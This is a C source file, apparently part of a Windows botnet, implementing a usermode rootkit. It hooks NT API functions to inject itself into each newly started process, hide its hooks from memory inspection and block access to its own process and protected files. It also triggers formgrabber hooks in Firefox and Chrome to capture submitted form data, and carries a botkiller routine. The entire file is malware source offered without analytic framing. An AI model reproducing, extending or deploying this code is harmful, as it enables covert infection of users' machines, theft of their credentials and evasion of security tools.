#include "rootkit.h"

#ifdef MODULE_ROOTKIT
#include "../common/ntheader.h"
#include "botThreads.h"
#include "..\common\mem.h"
#include "..\common\utils.h"
#include "inject.h"
#include "zombie.h"
#include "..\common\string.h"
#include "..\common\inject.h"
#include "..\common\hooking.h"
#include "..\common\api.h"
#include "..\common\crypto.h"

#include "file_persistence.h"

#ifdef MODULE_BOTKILLER
#include "botkiller.h"
#endif

#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#include "chromehooks.h"
#include "nss3.h"
#endif

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

#include "hook_manager.h"

extern bot_t bot;

BOOL WINAPI InitializeRootkit(void)
{
	dwOtherEntryPoint(NULL);
	return TRUE;
}

DWORD WINAPI malwareEntryPoint(void)
{
	HMODULE hMod;
	PIMAGE_NT_HEADERS ntHeaders;
	LPBYTE entry;

	if (!InitializeRootkit())
		return 0;

	if ((hMod = bot.api.pGetModuleHandleW(NULL)) == 0)
		return 0;

	if (((PIMAGE_DOS_HEADER)hMod)->e_magic == IMAGE_DOS_SIGNATURE)
	{
		ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
		if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			entry = ntHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)hMod;
			return ((PROC)entry)();
		}
	}

	return 0;
}

ptLdrInitializeThunk oLdrInitializeThunk;

NTSTATUS WINAPI LdrInitializeThunk_Callback(DWORD dw1, DWORD dw2, DWORD dw3)
{
	NTSTATUS Status;

	Status = oLdrInitializeThunk(dw1, dw2, dw3);

	if(_GetNTDLLModule() && _LoadNTDLLFunctions())
	{
		InitDebug();

		WriteDebugDataEx("A new process has been infected from LdrInitializeThunk hook.\r\n");

		InstallRootkit();
	}

	UnhookFunctionByOriginal(oLdrInitializeThunk, dwLdrInitializeThunkSize);

	return Status;
}

ptNtResumeThread oNtResumeThread;

NTSTATUS WINAPI NtResumeThread_Callback(HANDLE hThread, PULONG PreviousSuspendCount)
{
	OBJECT_ATTRIBUTES oa;
	CLIENT_ID ci;
	DWORD dwProcessID, dwFunctionSize;
	HANDLE hProcess;
	LPVOID lpLdrInitializeThunk;
	
	if((dwProcessID = GetProcessIdByThreadHandle(hThread)) != -1)
	{
		memzero(&oa, sizeof(OBJECT_ATTRIBUTES));
		oa.Length = sizeof(OBJECT_ATTRIBUTES);

		ci.ClientID0 = dwProcessID;
		ci.ClientID1 = 0;

		if(CWA(NtOpenProcess)(&hProcess, INJECT_PROCESS_RIGHTS, &oa, &ci) >= 0)
		{
			if(CopyImageToProcess(hProcess, bot.dwBaseAddress))
			{
				if((lpLdrInitializeThunk = HookRemoteFunction(hProcess, bot.modules.hNtdll, HASH_NTDLL_LDRINITIALIZETHUNK, LdrInitializeThunk_Callback, &dwFunctionSize)) != NULL)
				{
					SetRemoteVariable(hProcess, &oLdrInitializeThunk, &lpLdrInitializeThunk);
					SetRemoteVariable(hProcess, &dwLdrInitializeThunkSize, &dwFunctionSize);
				}
			}

			CWA(NtClose)(hProcess);
		}
	}

	return oNtResumeThread(hThread, PreviousSuspendCount);
}

ptNtCreateThread oNtCreateThread;

NTSTATUS WINAPI NtCreateThread_Callback(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PINITIAL_TEB InitialTeb, BOOLEAN CreateSuspended)
{
	/*DWORD dwPbiSize, dwThreadCount, dwEntryPoint;
	PROCESS_BASIC_INFORMATION pbi;
	memzero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if (bot.api.pNtQueryInformationProcess(ProcessHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &dwPbiSize) >= 0 && pbi.PebBaseAddress != 0)
	{
		dwThreadCount = pbi.UniqueProcessId == 0 ? 0 : GetCountOfThreadsByProcessId(pbi.UniqueProcessId);

		if (dwThreadCount == 0)
		{
			if ((dwEntryPoint = InjectCodeEx(ProcessHandle, malwareEntryPoint)) != 0)
			{
				ThreadContext->Eax = dwEntryPoint;
			}
		}
	}
	*/
	return oNtCreateThread(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, ClientId, ThreadContext, InitialTeb, CreateSuspended);
}

ptNtCreateUserProcess oNtCreateUserProcess;

NTSTATUS WINAPI NtCreateUserProcess_Callback(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList)
{
	NTSTATUS Result = oNtCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);
/*
#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	if (Result >= 0 && !IsCurrentThreadWhitelisted())
	{

	}
	*/
	return Result;
	
}

ptLdrLoadDll oLdrLoadDll;

NTSTATUS WINAPI LdrLoadDll_Callback(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
{
	NTSTATUS ldrLoadDllStatus, ldrGetDllHandleStatus;
	
	ldrGetDllHandleStatus = CWA(LdrGetDllHandle)(pathToFile, NULL, moduleFileName, moduleHandle);
	ldrLoadDllStatus = oLdrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);

	if (!(ldrGetDllHandleStatus >= 0) && ldrLoadDllStatus >= 0 && moduleHandle != 0 && *moduleHandle != 0 && moduleFileName != 0)
	{
		if(Crypto_CompareUnicodeStringEndByHash(*moduleFileName, 12, HASH_KERNEL32))
		{
			bot.modules.hKernel32 = *moduleHandle;

			API_LoadKernel32Functions();
		}
#ifdef MODULE_FORMGRABBER
		else if(Crypto_CompareUnicodeStringEndByHash(*moduleFileName, 8, HASH_NSS3) || Crypto_CompareUnicodeStringEndByHash(*moduleFileName, 9, HASH_NSPR4))
		{
			InstallFormgrabberHooks();
		}
		else if(Crypto_CompareUnicodeStringEndByHash(*moduleFileName, 10, HASH_CHROME))
		{
			initChromeHooks(*moduleHandle);
			installChromeHooks(*moduleHandle);
		}
#endif
	}

	return ldrLoadDllStatus;
}

ptNtWriteVirtualMemory oNtWriteVirtualMemory;

NTSTATUS WINAPI NtWriteVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL)
{
	if(ProcessHandle != CURRENT_PROCESS)
	{
	#ifdef WDEBUG
		WDEBUG("Called.");
	#endif
		IncreaseDangerLevel(ProcessHandle, 2);
	}
	return oNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

ptNtAllocateVirtualMemory oNtAllocateVirtualMemory;

NTSTATUS WINAPI NtAllocateVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect)
{
	if(ProcessHandle != CURRENT_PROCESS)
	{
	#ifdef WDEBUG
		WDEBUG("Called.");
	#endif
		IncreaseDangerLevel(ProcessHandle, 1);
	}
	return oNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

ptNtProtectVirtualMemory oNtProtectVirtualMemory;

NTSTATUS WINAPI NtProtectVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection)
{
	//Protect hook from modification
	if(IsAddressHooked(*BaseAddress))
		return STATUS_ACCESS_DENIED;

	return oNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

ptNtReadVirtualMemory oNtReadVirtualMemory;

NTSTATUS WINAPI NtReadVirtualMemory_Callback(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded)
{
	NTSTATUS Result;
	BYTE* lpOriginalBytes;
	DWORD dwOriginalLength, dwBytesToWrite;

	Result = oNtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);

	//Check if someone is trying to read our hooks
	if(IsAddressHooked(BaseAddress))
	{
#ifdef WDEBUG
	WDEBUG("Hook hider is active.");
#endif
		//Get original-bytes
		lpOriginalBytes = GetOriginalByAddress(BaseAddress, &dwOriginalLength);

		//Calculate how many bytes we need to replace
		if(*NumberOfBytesReaded >= dwOriginalLength)
			dwBytesToWrite = dwOriginalLength;
		else dwBytesToWrite = *NumberOfBytesReaded;

		//Replace JMP callback_Address with original-bytes to hide the hook
		//memcopy(Buffer, lpOriginalBytes, dwBytesToWrite);
	}

	return Result;
}

ptNtQueryVirtualMemory oNtQueryVirtualMemory;

NTSTATUS WINAPI NtQueryVirtualMemory_Callback(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID Buffer, ULONG Length, PULONG ResultLength)
{
	NTSTATUS Result;

	Result = oNtQueryVirtualMemory(ProcessHandle, BaseAddress, MemoryInformationClass, Buffer, Length, ResultLength);

	return Result;
}

ptNtDeviceIoControlFile oNtDeviceIoControlFile;

NTSTATUS WINAPI NtDeviceIoControlFile_Callback(IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN ULONG                IoControlCode,
	IN PVOID                InputBuffer OPTIONAL,
	IN ULONG                InputBufferLength,
	OUT PVOID               OutputBuffer OPTIONAL,
	IN ULONG                OutputBufferLength)
{
	return oNtDeviceIoControlFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength);
}

ptNtSetContextThread oNtSetContextThread;

NTSTATUS WINAPI NtSetContextThread_Callback(IN HANDLE               ThreadHandle,
	IN PCONTEXT             Context)
{
#ifdef WDEBUG
	WDEBUG("Called.");
#endif
	KillMalware();
	return oNtSetContextThread(ThreadHandle, Context);
}

ptNtOpenProcess oNtOpenProcess;

NTSTATUS WINAPI NtOpenProcess_Callback(OUT PHANDLE             ProcessHandle,
	IN ACCESS_MASK          AccessMask,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PCLIENT_ID           ClientId)
{
	NTSTATUS Result;
	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;
	HANDLE hProcess;
	DWORD dwCurrentPID;

	if(ClientId)
	{
		memcopy(&cid, ClientId, sizeof(CLIENT_ID));
	}

	oa.Length = sizeof(OBJECT_ATTRIBUTES);
	oa.RootDirectory = 0;
	oa.ObjectName = NULL;
	oa.Attributes = 0;

	Result = oNtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,&oa, &cid);

	if(Result >= 0)
	{
		dwCurrentPID = GetProcessIdByHandle(hProcess);

		CWA(NtClose)(hProcess);

		if(dwCurrentPID == bot.dwZombiePID)
		{
			return STATUS_ACCESS_DENIED;
		}
	}

	Result = oNtOpenProcess(ProcessHandle, AccessMask, ObjectAttributes, ClientId);

	if (Result >= 0)
	{
		AddBotkillHandle(*ProcessHandle);
	}

	return Result;
}

ptNtOpenThread oNtOpenThread;

NTSTATUS WINAPI NtOpenThread_Callback(					  _Out_ PHANDLE            ThreadHandle,
									  _In_  ACCESS_MASK        DesiredAccess,
									  _In_  POBJECT_ATTRIBUTES ObjectAttributes,
									  _In_  PCLIENT_ID         ClientId)
{
	NTSTATUS Result;
	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;
	HANDLE hThread;
	DWORD dwCurrentPID;

	if(ClientId)
	{
		memcopy(&cid, ClientId, sizeof(CLIENT_ID));
	}

	oa.Length = sizeof(OBJECT_ATTRIBUTES);
	oa.RootDirectory = 0;
	oa.ObjectName = NULL;
	oa.Attributes = 0;

	Result = oNtOpenThread(&hThread, THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION, &oa, &cid);

	if(Result >= 0)
	{
		dwCurrentPID = GetProcessIdByThreadHandle(hThread);
		CWA(NtClose)(hThread);

		if(dwCurrentPID == bot.dwZombiePID)
			return STATUS_ACCESS_DENIED;
	}

	Result = oNtOpenThread(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId);

	return Result;
}
ptNtClose oNtClose;

NTSTATUS WINAPI NtClose_Callback(HANDLE Handle)
{
	RemoveBotkillHandle(Handle);
	return oNtClose(Handle);
}

ptNtCreateFile oNtCreateFile;

NTSTATUS WINAPI NtCreateFile_Callback(_Out_    PHANDLE            FileHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_     POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_    PIO_STATUS_BLOCK   IoStatusBlock,
	_In_opt_ PLARGE_INTEGER     AllocationSize,
	_In_     ULONG              FileAttributes,
	_In_     ULONG              ShareAccess,
	_In_     ULONG              CreateDisposition,
	_In_     ULONG              CreateOptions,
	_In_     PVOID              EaBuffer,
	_In_     ULONG              EaLength)
{
/*	if(IsFileProtected(ObjectAttributes))
		return STATUS_ACCESS_DENIED;
*/
	return oNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

ptNtOpenFile oNtOpenFile;

NTSTATUS WINAPI NtOpenFile_Callback(					_Out_ PHANDLE            FileHandle,
									_In_  ACCESS_MASK        DesiredAccess,
									_In_  POBJECT_ATTRIBUTES ObjectAttributes,
									_Out_ PIO_STATUS_BLOCK   IoStatusBlock,
									_In_  ULONG              ShareAccess,
									_In_  ULONG              OpenOptions)
{
	if(IsFileProtected(ObjectAttributes))
		return STATUS_ACCESS_DENIED;

	return oNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

ptNtDeleteFile oNtDeleteFile;

NTSTATUS WINAPI NtDeleteFile_Callback(POBJECT_ATTRIBUTES ObjectAttributes)
{
	if(IsFileProtected(ObjectAttributes))
		return STATUS_ACCESS_DENIED;

	return oNtDeleteFile(ObjectAttributes);
}

BOOL WINAPI InstallRootkit(void)
{
	unsigned int i;
	BOOL bSuccess = FALSE;

	hook_t hooks[] =
	{
		{bot.api.pNtCreateThread, &NtCreateThread_Callback, (LPVOID*)&oNtCreateThread, 0},
		{bot.api.pLdrLoadDll, &LdrLoadDll_Callback, (LPVOID*)&oLdrLoadDll, 0},
		{bot.api.pNtWriteVirtualMemory, &NtWriteVirtualMemory_Callback, (LPVOID*)&oNtWriteVirtualMemory, 0},
		{bot.api.pNtAllocateVirtualMemory, &NtAllocateVirtualMemory_Callback, (LPVOID*)&oNtAllocateVirtualMemory, 0},
		{bot.api.pNtProtectVirtualMemory, &NtProtectVirtualMemory_Callback, (LPVOID*)&oNtProtectVirtualMemory, 0},
		{bot.api.pNtDeviceIoControlFile, &NtDeviceIoControlFile_Callback, (LPVOID*)&oNtDeviceIoControlFile, 0},
		{bot.api.pNtSetContextThread, &NtSetContextThread_Callback, (LPVOID*)&oNtSetContextThread, 0},
		{bot.api.pNtOpenProcess, &NtOpenProcess_Callback, (LPVOID*)&oNtOpenProcess, 0},
		{bot.api.pNtClose, &NtClose_Callback, (LPVOID*)&oNtClose, 0},
		{bot.api.pNtOpenFile, &NtOpenFile_Callback, (LPVOID*)&oNtOpenFile, 0},
		{bot.api.pNtDeleteFile, &NtDeleteFile_Callback, (LPVOID*)&oNtDeleteFile, 0},
	//	{bot.api.pNtCreateFile, &NtCreateFile_Callback, (LPVOID*)&oNtCreateFile, 0},
		{bot.api.pNtReadVirtualMemory, &NtReadVirtualMemory_Callback, (LPVOID*)&oNtReadVirtualMemory, 0},
		{bot.api.pNtQueryVirtualMemory, &NtQueryVirtualMemory_Callback, (LPVOID*)&oNtQueryVirtualMemory, 0},
		{bot.api.pNtOpenThread, &NtOpenThread_Callback, (LPVOID*)&oNtOpenThread, 0},
		{bot.api.pNtResumeThread, &NtResumeThread_Callback, (LPVOID*)&oNtResumeThread, 0}
	};

#ifdef MODULE_BOTKILLER
	InitBotkiller();
#endif

	InitHookManager();

	if (bot.api.pNtCreateUserProcess != 0)
	{
		hooks[0].lpFunctionAddress = bot.api.pNtCreateUserProcess;
		hooks[0].lpCallbackAddress = &NtCreateUserProcess_Callback;
		hooks[0].lpOriginalFunction = (LPVOID*)&oNtCreateUserProcess;
	}

	for (i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
	{
		/**hooks[i].lpOriginalFunction = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (HookFunction(hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, *hooks[i].lpOriginalFunction, &hooks[i].dwLength))
		{
			AddHook(hooks[i]);
			//ProtectHook(hooks[i].lpFunctionAddress);
			bSuccess = TRUE;
		}*/

		if((*hooks[i].lpOriginalFunction = HookRemoteFunctionEx(CURRENT_PROCESS, hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, &hooks[i].dwLength)) != NULL)
		{
			AddHook(hooks[i]);
			bSuccess = TRUE;
		}

	}

	return bSuccess;
}

#define makeptr( Base, Increment, Typecast ) ((Typecast)( (ULONG)(Base) + (ULONG)(Increment) ))
#define incptr( Base, Increment, Typecast ) ((Typecast)RVAToVA( (ULONG)(Base), (ULONG)(Increment) ))

ULONG RVAToVA( ULONG Base, ULONG Increment )
{
	USHORT i, SCount;
	PIMAGE_NT_HEADERS Nt;
	PIMAGE_SECTION_HEADER Sections;

	Nt = makeptr( Base, ((PIMAGE_DOS_HEADER)Base)->e_lfanew, PIMAGE_NT_HEADERS );
	SCount = Nt->FileHeader.NumberOfSections;
	Sections = makeptr( Nt, sizeof(*Nt), PIMAGE_SECTION_HEADER );

	for ( i = 0; i < SCount; i++ )
	{
		if ( (Increment >= Sections[i].VirtualAddress ) && (Increment <= (Sections[i].VirtualAddress + Sections[i].SizeOfRawData)) )
		{
			return ( (Increment - Sections[i].VirtualAddress) + Sections[i].PointerToRawData + Base);
		}
	}
	return Base + Increment;
}
#endif